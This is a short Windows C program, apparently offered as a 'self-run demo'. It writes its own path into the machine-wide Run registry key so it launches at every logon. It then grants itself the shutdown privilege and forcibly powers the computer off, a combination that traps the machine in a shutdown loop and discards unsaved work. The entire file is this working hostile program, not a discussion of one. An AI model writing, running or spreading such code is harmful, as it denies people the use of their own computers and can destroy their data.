#include <stdio.h>
#include <windows.h>

bool systemShutDown();

void main(void)
{
	
	// 根键、子键名称和到子键的句柄
	HKEY hRoot = HKEY_LOCAL_MACHINE;
	char *szSubKey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
	HKEY hKey;// 打开指定子键
	DWORD dwDisposition = REG_OPENED_EXISTING_KEY;
	// 如果不存在就创建
	LONG lRet =  RegCreateKeyEx(hRoot,     //父键句柄
								szSubKey,  //子键名称
								0, 
								NULL, 
								REG_OPTION_NON_VOLATILE, 
								KEY_ALL_ACCESS, 
								NULL, 
								&hKey, 
								&dwDisposition
								);
	if(lRet != ERROR_SUCCESS)
	return ;
	// 得到当前执行文件的文件名（包含路径）
	char szModule[MAX_PATH] ;
	GetModuleFileName (NULL, szModule, MAX_PATH);
	// 创建一个新的键值，设置键值数据为文件名
	lRet = RegSetValueEx(hKey,
						"SelfRunDemo",
						0,REG_SZ,
						(BYTE*)szModule,
						strlen(szModule));
		if(lRet == ERROR_SUCCESS)
		{
			printf(" self run success\n");
		}
// 关闭子键句柄
RegCloseKey(hKey);
systemShutDown();
}

bool systemShutDown()
{
    HANDLE hToken;

    TOKEN_PRIVILEGES tkp;


    //获取进程标志
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        return false;

    }
    //获取关机特权的LUID
    LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid);
    tkp.PrivilegeCount = 1;

    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;


    //获取这个进程的关机特权
    AdjustTokenPrivileges(hToken, false, &tkp, 0, (PTOKEN_PRIVILEGES)NULL, 0);
    if (GetLastError() != ERROR_SUCCESS) {
        return false;

    }


    // 强制关闭计算机
    if ( !ExitWindowsEx(EWX_SHUTDOWN | EWX_FORCE, 0)) {
        return false;
    }
    return true;
/*
    // 强制重启计算机
     if ( !ExitWindowsEx(EWX_REBOOT| EWX_FORCE, 0))
           return false;
     return true;
*/
 } 
